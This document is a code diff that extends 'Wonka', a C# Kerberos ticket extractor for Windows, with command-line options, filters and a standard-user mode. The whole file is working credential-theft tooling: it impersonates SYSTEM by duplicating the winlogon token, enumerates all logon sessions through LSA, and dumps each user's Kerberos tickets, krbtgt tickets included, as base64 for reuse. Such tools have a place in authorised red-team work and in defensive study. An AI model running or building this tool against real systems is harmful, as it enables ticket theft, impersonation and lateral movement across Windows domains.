@@ -1,57 +1,278 @@
-﻿using System.Diagnostics;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 
 class Program
-{    static void Main(string[] args)
-    {        Console.WriteLine("Starting Kerberos ticket extraction process...");
-        
+{
+    static int Main(string[] args)
+    {
+        CliOptions options;
         try
         {
-            var ticketDumper = new KerberosTicketDumper();
-            ticketDumper.DumpTickets();
+            options = CliOptions.Parse(args);
+        }
+        catch (ArgumentException ex)
+        {
+            Console.WriteLine($"[-] Invalid arguments: {ex.Message}\n");
+            CliOptions.PrintUsage();
+            return 1;
+        }
+
+        if (options.ShowHelp)
+        {
+            CliOptions.PrintUsage();
+            return 0;
+        }
+
+        Console.WriteLine("Starting Kerberos ticket extraction process...");
+
+        try
+        {
+            var ticketDumper = new KerberosTicketDumper(options);
+            ticketDumper.Run();
         }
         catch (Exception ex)
         {
             Console.WriteLine($"Critical error: {ex.Message}");
             Console.WriteLine(ex.StackTrace);
+            return 1;
         }
-        
+
         Console.WriteLine("Process completed.");
+        return 0;
+    }
+}
+
+/// 
+/// What the user asked the tool to do.
+/// 
+public enum RunMode
+{
+    /// List users and ticket metadata only (no base64 extraction).
+    List,
+    /// Extract tickets (base64), optionally filtered to a single ticket.
+    Dump
+}
+
+/// 
+/// Parsed command line options.
+/// 
+public class CliOptions
+{
+    public RunMode Mode { get; private set; } = RunMode.Dump;
+    public bool ShowHelp { get; private set; }
+
+    /// Only process the session with this LUID low part (filter). Null = all.
+    public uint? LuidFilter { get; private set; }
+
+    /// Only dump tickets whose server name contains this value (case-insensitive). Null = all.
+    public string? ServiceFilter { get; private set; }
+
+    public bool HasFilter => LuidFilter.HasValue || ServiceFilter != null;
+
+    public static CliOptions Parse(string[] args)
+    {
+        var options = new CliOptions();
+
+        // No arguments -> show help instead of running a dump.
+        if (args.Length == 0)
+        {
+            options.ShowHelp = true;
+            return options;
+        }
+
+        foreach (var raw in args)
+        {
+            // Normalize: accept "list", "/list", "--list", "-list".
+            string arg = raw.TrimStart('-', '/');
+            string key = arg;
+            string? value = null;
+
+            int sep = arg.IndexOfAny(new[] { ':', '=' });
+            if (sep >= 0)
+            {
+                key = arg.Substring(0, sep);
+                value = arg.Substring(sep + 1);
+            }
+
+            switch (key.ToLowerInvariant())
+            {
+                case "list":
+                    options.Mode = RunMode.List;
+                    break;
+                case "dump":
+                    options.Mode = RunMode.Dump;
+                    break;
+                case "luid":
+                    if (string.IsNullOrEmpty(value))
+                        throw new ArgumentException("/luid requires a value, e.g. /luid:0x3e7");
+                    options.LuidFilter = ParseLuid(value);
+                    break;
+                case "service":
+                    if (string.IsNullOrEmpty(value))
+                        throw new ArgumentException("/service requires a value, e.g. /service:krbtgt");
+                    options.ServiceFilter = value;
+                    break;
+                case "h":
+                case "help":
+                case "?":
+                    options.ShowHelp = true;
+                    break;
+                default:
+                    throw new ArgumentException($"unknown option '{raw}'");
+            }
+        }
+
+        // A LUID/service filter only makes sense when extracting a single ticket.
+        if (options.Mode == RunMode.List && options.HasFilter)
+            throw new ArgumentException("/luid and /service can only be used with dump, not list");
+
+        return options;
+    }
+
+    private static uint ParseLuid(string value)
+    {
+        value = value.Trim();
+        bool hex = value.StartsWith("0x", StringComparison.OrdinalIgnoreCase);
+        string body = hex ? value.Substring(2) : value;
+        if (uint.TryParse(body,
+                hex ? System.Globalization.NumberStyles.HexNumber : System.Globalization.NumberStyles.Integer,
+                System.Globalization.CultureInfo.InvariantCulture,
+                out uint result))
+        {
+            return result;
+        }
+        throw new ArgumentException($"could not parse LUID '{value}'");
+    }
+
+    public static void PrintUsage()
+    {
+        Console.WriteLine(@"Wonka - Kerberos ticket extractor
+
+Usage:
+  Wonka.exe <list|dump> [/luid:<luid>] [/service:<name>]
+
+  Run with no arguments (or -h) to show this help.
+
+Privileges:
+  Run as administrator  -> processes every logon session on the host.
+  Run as standard user  -> processes only the current user's tickets.
+
+Modes:
+  dump                  Extract tickets (base64) for every accessible session.
+  list                  List users and ticket metadata only (no base64).        [admin]
+
+Filters (dump only, used to extract a single ticket):
+  /luid:<luid>          Only the session with this LUID, e.g. /luid:0x3e7 or /luid:999.
+  /service:<name>       Only tickets whose server name contains <name>,
+                        e.g. /service:krbtgt or /service:cifs/server.domain
+
+Examples:
+  Wonka.exe dump                             Dump all accessible tickets.
+  Wonka.exe list                             List users and their tickets.
+  Wonka.exe dump /luid:0x3e7 /service:krbtgt Dump a single krbtgt ticket for a session.
+  Wonka.exe -h                               Show this help.");
     }
 }
 
 public class KerberosTicketDumper
 {
+    private readonly CliOptions options;
+
     private IntPtr tokenHandle = IntPtr.Zero;
     private IntPtr dupTokenHandle = IntPtr.Zero;
     private IntPtr lsaHandle = IntPtr.Zero;
+    private uint authPackage;
+    private bool impersonating;
 
-    public void DumpTickets()
-    {        try
+    public KerberosTicketDumper(CliOptions options)
+    {
+        this.options = options;
+    }
+
+    public void Run()
+    {
+        bool isAdmin = IsElevated();
+        Console.WriteLine(isAdmin
+            ? "[+] Running with administrative privileges"
+            : "[*] Running as a standard user - only the current user's tickets are accessible");
+
+        try
         {
-            if (!ImpersonateSystem())
-            {
-                Console.WriteLine("[-] Could not impersonate as SYSTEM");
-                return;
-            }
-
-            if (!InitializeLSA())
-            {
-                Console.WriteLine("[-] Could not initialize LSA");
-                return;
-            }
-
-            ProcessLogonSessions();
+            if (isAdmin)
+                DumpAllSessions();
+            else
+                DumpCurrentUser();
         }
         finally
         {
             Cleanup();
         }
     }
+
+    private static bool IsElevated()
+    {
+        try
+        {
+            using var identity = WindowsIdentity.GetCurrent();
+            var principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+        catch
+        {
+            return false;
+        }
+    }
+
+    // ---------------------------------------------------------------------
+    // Administrative path: impersonate SYSTEM and enumerate every session.
+    // ---------------------------------------------------------------------
+    private void DumpAllSessions()
+    {
+        if (!ImpersonateSystem())
+        {
+            Console.WriteLine("[-] Could not impersonate as SYSTEM");
+            return;
+        }
+
+        if (!InitializeLSAPrivileged())
+        {
+            Console.WriteLine("[-] Could not initialize LSA");
+            return;
+        }
+
+        ProcessLogonSessions();
+    }
+
+    // ---------------------------------------------------------------------
+    // Standard-user path: untrusted LSA connection, current session only.
+    // ---------------------------------------------------------------------
+    private void DumpCurrentUser()
+    {
+        if (!InitializeLSAUntrusted())
+        {
+            Console.WriteLine("[-] Could not initialize LSA");
+            return;
+        }
+
+        string? currentUser = null;
+        try { currentUser = WindowsIdentity.GetCurrent().Name; } catch { /* best effort */ }
+
+        var sessionData = new win32.LogonSessionData
+        {
+            username = currentUser ?? "(current user)",
+            LogonDomain = Environment.UserDomainName,
+            AuthenticationPackage = "Kerberos"
+        };
+
+        // LUID {0,0} means "the caller's own logon session" for an untrusted handle.
+        var ownLuid = new win32.LUID { LowPart = 0, HighPart = 0 };
+        int ticketCount = ProcessTicketCache(ownLuid, sessionData);
+        Console.WriteLine($"\n[+] Total tickets processed: {ticketCount}");
+    }
+
     private bool ImpersonateSystem()
     {
-        // Get token from winlogon process
         var winlogonProcesses = Process.GetProcessesByName("winlogon");
         if (winlogonProcesses.Length == 0)
         {
@@ -63,7 +284,6 @@ public class KerberosTicketDumper
         Console.WriteLine($"[+] Winlogon process found (PID: {winlogon.Id})");
         try
         {
-            // Get process token
             bool status = win32.OpenProcessToken(winlogon.Handle, win32.TOKEN_QUERY | win32.TOKEN_DUPLICATE, out tokenHandle);
             if (!status)
             {
@@ -72,7 +292,6 @@ public class KerberosTicketDumper
             }
             Console.WriteLine("[+] Token obtained successfully");
 
-            // Duplicate token
             status = win32.DuplicateTokenEx(tokenHandle, win32.MAXIMUM_ALLOWED, IntPtr.Zero,
                 win32.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                 win32.TOKEN_TYPE.TokenPrimary, out dupTokenHandle);
@@ -83,14 +302,15 @@ public class KerberosTicketDumper
             }
             Console.WriteLine("[+] Token duplicated successfully");
 
-            // Impersonate SYSTEM user
             status = win32.ImpersonateLoggedOnUser(dupTokenHandle);
             if (!status)
             {
                 Console.WriteLine($"[-] Error impersonating user: {Marshal.GetLastWin32Error()}");
                 return false;
             }
-            string? currentUser = null;
+            impersonating = true;
+
+            string? currentUser;
             try
             {
                 currentUser = WindowsIdentity.GetCurrent().Name;
@@ -117,17 +337,19 @@ public class KerberosTicketDumper
             return false;
         }
     }
-    private bool InitializeLSA()
+
+    private bool InitializeLSAPrivileged()
     {
+        const string logonProcessName = "User32LogonProcess";
+        IntPtr nameBuffer = Marshal.StringToHGlobalAnsi(logonProcessName);
         try
         {
-            // Register LSA logon process
-            win32.LSA_STRING_IN LSAString;
-            var LogonProcessName = "User32LogonProcess";
-
-            LSAString.Length = (ushort)LogonProcessName.Length;
-            LSAString.MaximumLength = (ushort)(LogonProcessName.Length + 1);
-            LSAString.buffer = Marshal.StringToHGlobalAnsi(LogonProcessName);
+            win32.LSA_STRING_IN LSAString = new win32.LSA_STRING_IN
+            {
+                Length = (ushort)logonProcessName.Length,
+                MaximumLength = (ushort)(logonProcessName.Length + 1),
+                buffer = nameBuffer
+            };
 
             var ret = win32.LsaRegisterLogonProcess(LSAString, out lsaHandle, out _);
             if (ret != 0)
@@ -137,23 +359,32 @@ public class KerberosTicketDumper
             }
             Console.WriteLine("[+] LSA Process registered successfully");
 
-            // Look up Kerberos authentication package
-            UInt32 authPackage;
-            var krbname = "kerberos";
-            LSAString.Length = (ushort)krbname.Length;
-            LSAString.MaximumLength = (ushort)(krbname.Length + 1);
-            LSAString.buffer = Marshal.StringToHGlobalAnsi(krbname);
+            return LookupKerberosPackage();
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"[-] Error during LSA initialization: {ex.Message}");
+            return false;
+        }
+        finally
+        {
+            Marshal.FreeHGlobal(nameBuffer);
+        }
+    }
 
-            var retcode = win32.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPackage);
-            if (retcode != 0)
+    private bool InitializeLSAUntrusted()
+    {
+        try
+        {
+            var ret = win32.LsaConnectUntrusted(out lsaHandle);
+            if (ret != 0)
             {
-                Console.WriteLine($"[-] Error looking up Kerberos authentication package: {retcode}");
+                Console.WriteLine($"[-] Error in LsaConnectUntrusted: {ret}");
                 return false;
             }
-            Console.WriteLine("[+] Kerberos authentication package found");
+            Console.WriteLine("[+] LSA untrusted connection established");
 
-            this.authPackage = authPackage;
-            return true;
+            return LookupKerberosPackage();
         }
         catch (Exception ex)
         {
@@ -162,13 +393,38 @@ public class KerberosTicketDumper
         }
     }
 
-    private uint authPackage;
+    private bool LookupKerberosPackage()
+    {
+        const string krbname = "kerberos";
+        IntPtr nameBuffer = Marshal.StringToHGlobalAnsi(krbname);
+        try
+        {
+            win32.LSA_STRING_IN LSAString = new win32.LSA_STRING_IN
+            {
+                Length = (ushort)krbname.Length,
+                MaximumLength = (ushort)(krbname.Length + 1),
+                buffer = nameBuffer
+            };
+
+            var retcode = win32.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out uint package);
+            if (retcode != 0)
+            {
+                Console.WriteLine($"[-] Error looking up Kerberos authentication package: {retcode}");
+                return false;
+            }
+            Console.WriteLine("[+] Kerberos authentication package found");
+            authPackage = package;
+            return true;
+        }
+        finally
+        {
+            Marshal.FreeHGlobal(nameBuffer);
+        }
+    }
 
     private void ProcessLogonSessions()
     {
-        uint count;
-        IntPtr luidPtr;
-        var ret = win32.LsaEnumerateLogonSessions(out count, out luidPtr);
+        var ret = win32.LsaEnumerateLogonSessions(out uint count, out IntPtr luidPtr);
         if (ret != 0)
         {
             Console.WriteLine($"[-] Could not enumerate logon sessions: {ret}");
@@ -176,10 +432,10 @@ public class KerberosTicketDumper
         }
 
         Console.WriteLine($"[+] Logon sessions found: {count}");
-        
+
         List<win32.LUID> luids = new List<win32.LUID>();
         IntPtr currentPtr = luidPtr;
-        
+
         for (var i = 0; i < count; i++)
         {
             win32.LUID luid = Marshal.PtrToStructure<win32.LUID>(currentPtr);
@@ -192,19 +448,21 @@ public class KerberosTicketDumper
         int ticketCount = 0;
         foreach (win32.LUID luid in luids)
         {
+            // Apply the LUID filter early so we skip unrelated sessions entirely.
+            if (options.LuidFilter.HasValue && luid.LowPart != options.LuidFilter.Value)
+                continue;
+
             try
             {
-                var sessionTickets = ProcessSession(luid);
-                ticketCount += sessionTickets;
+                ticketCount += ProcessSession(luid);
             }
-
             catch (Exception ex)
             {
                 Console.WriteLine($"[-] Error processing session {luid.LowPart}: {ex.Message}");
             }
         }
-        
-        Console.WriteLine($"[+] Total tickets processed: {ticketCount}");
+
+        Console.WriteLine($"\n[+] Total tickets processed: {ticketCount}");
     }
 
     private int ProcessSession(win32.LUID luid)
@@ -216,7 +474,7 @@ public class KerberosTicketDumper
         try
         {
             Marshal.StructureToPtr(luid, luidPtr, false);
-              uint retGetLogon = win32.LsaGetLogonSessionData(luidPtr, out sessionDataPtr);
+            uint retGetLogon = win32.LsaGetLogonSessionData(luidPtr, out sessionDataPtr);
             if (retGetLogon != 0 || sessionDataPtr == IntPtr.Zero)
             {
                 return 0; // Invalid session, continue with next
@@ -233,8 +491,10 @@ public class KerberosTicketDumper
                 logonType = (win32.LogonType)unsafeData.logontype,
                 username = Marshal.PtrToStringUni(unsafeData.username.buffer, unsafeData.username.Length / 2),
                 LogonDomain = Marshal.PtrToStringUni(unsafeData.LogonDomain.buffer, unsafeData.LogonDomain.Length / 2)
-            };            // Only process sessions with valid users
-            if (string.IsNullOrEmpty(logonSessionData.username) || 
+            };
+
+            // Only process sessions with valid users
+            if (string.IsNullOrEmpty(logonSessionData.username) ||
                 logonSessionData.username.EndsWith("$") ||
                 logonSessionData.logonType == win32.LogonType.UndefinedLogonType)
             {
@@ -269,8 +529,8 @@ public class KerberosTicketDumper
         try
         {
             Marshal.StructureToPtr(ticketCacheRequest, tQueryPtr, false);
-            
-            var retcode = win32.LsaCallAuthenticationPackage(lsaHandle, authPackage, tQueryPtr, 
+
+            var retcode = win32.LsaCallAuthenticationPackage(lsaHandle, authPackage, tQueryPtr,
                 Marshal.SizeOf(ticketCacheRequest), out ticketsPointer, out ulong returnBufferLength, out int protocolStatus);
 
             if (retcode != 0 || ticketsPointer == IntPtr.Zero)
@@ -284,12 +544,12 @@ public class KerberosTicketDumper
             if (count == 0)
             {
                 return 0;
-            }            Console.WriteLine($"\n[+] User: {logonSessionData.username}@{logonSessionData.LogonDomain}");
-            
-            Console.WriteLine($"[+] Tickets found: {count}");
+            }
 
-            var ticketInfo = new win32.KERB_TICKET_CACHE_INFO_EX();
-            int dataSize = Marshal.SizeOf(ticketInfo.GetType());
+            Console.WriteLine($"\n[+] User: {logonSessionData.username}@{logonSessionData.LogonDomain}");
+            Console.WriteLine($"[+] LogonId: 0x{logonSessionData.LogonID.LowPart:x} | Tickets found: {count}");
+
+            int dataSize = Marshal.SizeOf<win32.KERB_TICKET_CACHE_INFO_EX>();
 
             for (var j = 0; j < count; j++)
             {
@@ -297,11 +557,26 @@ public class KerberosTicketDumper
                 {
                     IntPtr currTicketPtr = (IntPtr)(ticketsPointer.ToInt64() + (8 + j * dataSize));
                     win32.KERB_TICKET_CACHE_INFO_EX ticketResult = Marshal.PtrToStructure<win32.KERB_TICKET_CACHE_INFO_EX>(currTicketPtr);
-                    
+
+                    // Apply the service filter (e.g. only the krbtgt ticket).
+                    if (options.ServiceFilter != null)
+                    {
+                        string serverName = Marshal.PtrToStringUni(ticketResult.ServerName.Buffer, ticketResult.ServerName.Length / 2) ?? string.Empty;
+                        if (serverName.IndexOf(options.ServiceFilter, StringComparison.OrdinalIgnoreCase) < 0)
+                            continue;
+                    }
+
                     DisplayTicketInfo(logonSessionData, ticketResult);
-                    ExtractTicket(luid, ticketResult);
+
+                    // In list mode we only show metadata; we never extract the base64 blob.
+                    if (options.Mode == RunMode.Dump)
+                        ExtractTicket(luid, ticketResult);
+                    else
+                        Console.WriteLine("-----------------------------------------------------------------------\n");
+
                     ticketCount++;
-                }                catch (Exception ex)
+                }
+                catch (Exception ex)
                 {
                     Console.WriteLine($"[-] Error processing ticket {j}: {ex.Message}");
                 }
@@ -341,9 +616,17 @@ public class KerberosTicketDumper
     {
         IntPtr responsePointer = IntPtr.Zero;
         IntPtr unmanagedAddr = IntPtr.Zero;
+        IntPtr targetNameBuffer = IntPtr.Zero;
 
         try
         {
+            string? serverName = Marshal.PtrToStringUni(ticketResult.ServerName.Buffer, ticketResult.ServerName.Length / 2);
+            if (string.IsNullOrEmpty(serverName))
+            {
+                Console.WriteLine("[-] Skipping ticket: empty server name");
+                return;
+            }
+
             win32.KERB_RETRIEVE_TKT_REQUEST request = new win32.KERB_RETRIEVE_TKT_REQUEST
             {
                 MessageType = win32.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage,
@@ -353,12 +636,12 @@ public class KerberosTicketDumper
                 EncryptionType = 0x0
             };
 
-            string serverName = Marshal.PtrToStringUni(ticketResult.ServerName.Buffer, ticketResult.ServerName.Length / 2);
+            targetNameBuffer = Marshal.StringToHGlobalUni(serverName);
             win32.UNICODE_STRING tname = new win32.UNICODE_STRING
             {
                 Length = (ushort)(serverName.Length * 2),
                 MaximumLength = (ushort)(serverName.Length * 2 + 2),
-                Buffer = Marshal.StringToHGlobalUni(serverName)
+                Buffer = targetNameBuffer
             };
             request.TargetName = tname;
 
@@ -374,7 +657,7 @@ public class KerberosTicketDumper
             int size = IntPtr.Size == 8 ? 24 : 16;
             Marshal.WriteIntPtr(unmanagedAddr, size, newTargetNameBuffPtr);
 
-            var retcode = win32.LsaCallAuthenticationPackage(lsaHandle, authPackage, unmanagedAddr, newStructSize, 
+            var retcode = win32.LsaCallAuthenticationPackage(lsaHandle, authPackage, unmanagedAddr, newStructSize,
                 out responsePointer, out ulong returnBufferLength, out int protocolStatus);
 
             if (retcode == 0 && returnBufferLength != 0)
@@ -387,7 +670,8 @@ public class KerberosTicketDumper
 
                 Console.WriteLine($"Ticket b64 ---> {Convert.ToBase64String(EncodedTicket)}");
                 Console.WriteLine($"EncType ---> {(win32.EncTypes)response.Ticket.SessionKey.KeyType}");
-            }            else
+            }
+            else
             {
                 Console.WriteLine($"[-] Error extracting ticket: {retcode}, ProtocolStatus: {protocolStatus}");
             }
@@ -402,6 +686,8 @@ public class KerberosTicketDumper
                 win32.LsaFreeReturnBuffer(responsePointer);
             if (unmanagedAddr != IntPtr.Zero)
                 Marshal.FreeHGlobal(unmanagedAddr);
+            if (targetNameBuffer != IntPtr.Zero)
+                Marshal.FreeHGlobal(targetNameBuffer);
         }
 
         Console.WriteLine("-----------------------------------------------------------------------\n");
@@ -411,6 +697,12 @@ public class KerberosTicketDumper
     {
         try
         {
+            if (impersonating)
+            {
+                win32.RevertToSelf();
+                impersonating = false;
+            }
+
             if (tokenHandle != IntPtr.Zero)
             {
                 win32.CloseHandle(tokenHandle);
@@ -427,7 +719,8 @@ public class KerberosTicketDumper
             {
                 win32.LsaDeregisterLogonProcess(lsaHandle);
                 lsaHandle = IntPtr.Zero;
-            }            Console.WriteLine("[+] Resources cleaned up successfully");
+            }
+            Console.WriteLine("[+] Resources cleaned up successfully");
         }
         catch (Exception ex)
         {
